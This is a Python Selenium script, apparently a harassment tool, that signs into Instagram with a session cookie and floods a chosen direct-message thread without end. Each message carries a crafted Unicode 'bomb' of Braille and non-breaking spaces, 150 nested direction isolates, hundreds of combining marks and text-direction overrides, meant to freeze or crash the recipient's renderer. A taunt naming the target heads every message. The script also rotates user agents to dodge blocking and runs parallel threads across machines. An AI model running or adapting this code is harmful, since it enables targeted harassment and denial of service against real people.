# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (20-AGENT OVERFLOW)
# 📅 STATUS: WIDTH-SATURATION | NESTED-ISOLATE | 20-AGENT SYNC

import os, time, random, sys, gc, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS_PER_MACHINE = 2
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_overflow_payload(target_name):
    """Bypasses Scroll-Pushing by forcing Layout Calculation on Arrival."""
    u_id = random.randint(1000, 9999)
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 OVR_{MACHINE_ID}_{u_id}\n"
    
    # 💥 THE 'WIDTH-BOMB' (Non-breaking spaces + Braille)
    # Forces horizontal layout reflow even if the message is off-screen.
    width_bomb = "\u2800\u00A0" * 160 
    
    # 💥 THE 'DEPTH-BOMB' (150 nested Isolates)
    # Forces a stack overflow in the browser's text-processing engine.
    depth_bomb = "\u2066\u2067\u2068" * 150
    
    # 💥 DENSITY x50 (The rendering anchor)
    z_tower = "̸" * 500

    lines = [header, width_bomb]
    for i in range(40):
        # Directional Flip to prevent the browser from 'lazy-loading' the lines
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}{z_tower}{depth_bomb}")
    
    return "\n".join(lines)[:9995]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    # Rotate User-Agents to prevent socket-level blocking
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 122)}.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def agent_blitz(agent_id, cookie, target_id, target_name):
    driver = None
    strike_count = 0
    while True:
        try:
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(10)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            while True:
                # 🚀 DOM-PURGE: Refresh runner every 15 strikes to keep it fast
                if strike_count > 15:
                    driver.refresh()
                    time.sleep(8)
                    strike_count = 0

                box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                payload = get_overflow_payload(target_name)
                
                # 🔥 ATOMIC INJECTION
                driver.execute_script("""
                    var box = arguments[0];
                    document.execCommand('insertText', false, arguments[1]);
                    box.dispatchEvent(new Event('input', { bubbles: true }));
                """, box, payload)
                
                box.send_keys(Keys.ENTER)
                strike_count += 1
                print(f"💀 [M{MACHINE_ID}-A{agent_id}] OVERFLOW STRIKE {strike_count}", flush=True)
                
                # KILL LOCAL RENDERING
                driver.execute_script("window.stop();")
                time.sleep(0.01) # Instant cycle

        except Exception:
            if driver: driver.quit()
            time.sleep(5)
            continue

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(THREADS_PER_MACHINE):
            executor.submit(agent_blitz, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
